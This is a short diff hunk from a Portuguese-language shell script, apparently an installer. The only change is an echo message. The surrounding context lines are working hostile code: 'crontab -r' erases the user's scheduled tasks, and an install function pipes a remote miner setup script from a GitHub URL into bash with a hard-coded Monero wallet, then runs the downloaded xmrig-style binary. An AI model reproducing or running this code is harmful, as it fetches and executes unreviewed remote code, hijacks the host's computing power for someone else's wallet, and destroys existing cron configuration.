@@ -58,7 +58,7 @@ crontab -r >/dev/null 2>&1
 ) | crontab -
 
 echo ""
-echo -e "\033[1;33mINSTALANDO SCRIPT MINERADOR MONERO!\033[0m"
+echo -e "\033[1;33mPRONTO! BAIXANDO SCRIPT MINNER MONERO!\033[0m"
 echo ""
 inst_minner () {
 curl -s -L https://raw.githubusercontent.com/juniorfdtech/update/master/setup_minner.sh | bash -s 8BvGDdUNdGwG5B9oNUywNc9yh7ggEJjskRyBhUYNLT63fjryxsVRLsmVED7JvJTyfq5zjkAVxcdohdmgX7b9UFS2GWUWWEq && cd mo* && ./xm*
